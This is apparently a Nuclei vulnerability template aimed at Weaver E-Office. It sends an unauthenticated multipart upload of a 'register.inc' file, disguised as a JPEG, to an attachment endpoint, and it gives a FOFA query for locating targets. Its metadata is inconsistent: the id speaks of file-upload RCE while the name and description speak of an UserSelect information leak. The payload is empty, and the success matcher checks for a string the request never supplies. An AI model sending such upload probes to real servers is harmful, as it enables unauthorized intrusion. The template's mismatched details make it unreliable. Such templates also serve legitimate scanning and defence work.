id: eoffice-unauth-file-rce

info:
  name: OA E-Office UserSelect Unauthorized Access
  author: SleepingBag945
  severity: high
  description: |
    OA E-Office UserSelect interface has an unauthorized access vulnerability, through which attackers can obtain sensitive information
  reference:
    - https://github.com/achuna33/MYExploit/blob/8ffbf7ee60cbd77ad90b0831b93846aba224ab29/src/main/java/com/achuna33/Controllers/WeaverEOfficeController.java
    - http://wiki.peiqi.tech/wiki/oa/泛微OA/泛微OA%20E-Office%20UserSelect%20未授权访问漏洞.html
  classification:
    cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: weaver
    product: e-office
    fofa-query: app="泛微-EOffice"
  tags: weaver,e-office,oa,unauth,vuln

http:
  - raw:
      - |
        POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: multipart/form-data; boundary=---------------------------267365731428755943603976921494
        Connection: keep-alive
        Cache-Control: no-cache
        Pragma: no-cache

        -----------------------------267365731428755943603976921494
        Content-Disposition: form-data; name="Filedata"; filename="register.inc"
        Content-Type: image/jpeg

        {{base64_decode("")}}
        -----------------------------267365731428755943603976921494--

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "stctest"
      - type: status
        status:
          - 200
